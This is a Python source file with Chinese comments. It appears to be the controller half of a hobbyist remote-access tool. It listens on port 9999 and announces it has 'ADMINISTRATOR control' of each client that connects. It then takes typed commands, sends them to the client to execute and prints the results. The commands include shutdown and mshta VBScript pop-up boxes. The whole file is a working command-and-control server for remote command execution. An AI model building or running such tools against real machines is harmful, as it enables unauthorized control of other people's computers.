#b7.0添加了自定义指令

import socket,sys,os,time
def help():
    print("""

    dir 访问指定目录
    shutdown 关机
    ----JZY咸鱼工造---
    """)
#服务器程序

#注，因为是短连接，所以在通信后套接字似乎就会失效
while 1==1:
# 创建 socket 对象
 serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

# 获取本地主机名
 host = socket.gethostname()
 print (host)
 port = 9999
# 绑定端口号

 serversocket.bind((host, port))

# 设置最大连接数，超过后排队
 serversocket.listen()
 
 print("---正在等待连接---")
 while True:

    # 建立客户端连接
    clientsocket,addr = serversocket.accept()      
    print("--------------------------------------------------------------------------------")
    print("已连接: %s" % str(addr))
    print("--------------------------------------------------------------------------------")
    time.sleep(0.5)#█
    qwe=0
    print("请稍等：",end='')
    while qwe<=34:
        print("█",end='')
        time.sleep(0.03)
        qwe=qwe+1
    print("█")
    print("已获取ADMINISTRATOR控制权！")


    #-----------------------------
    data=input("System call >>")
    if data[:6]=="msgbox":
        print("Msgbox sending!")
        data="mshta vbscript:msgbox(\"" + data[7:] +"\",64,\"警告\")(window.close)"

    #-----------------------------
    if data=="help":#帮助
        help()
        pass
    clientsocket.send(data.encode('utf-8'))#发送指令
    
    timess=clientsocket.recv(3096)#接收返回的内容行数
    timess=timess.decode('utf-8')
    print(timess)
    ttt=0
    timess=int(timess)
    while ttt<=timess:
        xxx=clientsocket.recv(3096)
        yyy=xxx.decode('utf-8')
        print(yyy)
        if yyy=="":
            break
        ttt=ttt+1
    clientsocket.close()
